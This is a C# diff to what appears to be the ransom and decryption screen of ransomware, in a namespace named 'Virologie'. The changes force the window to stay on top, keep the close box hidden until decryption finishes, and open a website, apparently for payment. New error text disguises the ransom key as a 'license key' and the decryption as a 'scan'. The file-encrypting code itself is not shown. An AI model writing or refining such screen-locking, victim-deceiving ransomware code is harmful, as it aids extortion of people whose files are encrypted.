@@ -19,6 +19,7 @@ namespace Virologie
             InitializeComponent();
 
             GuidBox.Text = CryptoKeyManager.guid.ToString();
+            TopMost = true;
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -36,17 +37,18 @@ namespace Virologie
             }
             catch (Exception ex)
             {
-                return;
+                MessageBox.Show(
+                    "The file you provided is not a correct key. Please make sure you select the license key given when you registered",
+                    "Error during scan",
+                    MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
 
             _worker = new EncryptWorker(name);
             _worker.ProgressChanged += _worker_ProgressChanged;
             _worker.RunWorkerCompleted += _worker_RunWorkerCompleted;
 
-            label3.Location = progressBar1.Location;
-            label3.Visible = true;
-            progressBar1.Location = GuidBox.Location;
-            progressBar1.Visible = true;
+            panel1.Location = GuidBox.Location;
+            panel1.Visible = true;
             GuidBox.Visible = false;
             decryptButton.Enabled = false;
             button1.Enabled = false;
@@ -70,17 +72,21 @@ namespace Virologie
                         MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
-
-            progressBar1.Value = 100;
             label3.Text = "Cleanup complete";
             CryptoKeyManager.CleanGuid();
+            ControlBox = true;
         }
 
         void _worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
         {
-            progressBar1.Value = e.ProgressPercentage;
 
             label3.Text = string.Format("Decrypting {0}", _worker.CurrentFile);
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            TopMost = false;
+            CryptoKeyManager.OpenWebsite();
         }
     }
 }
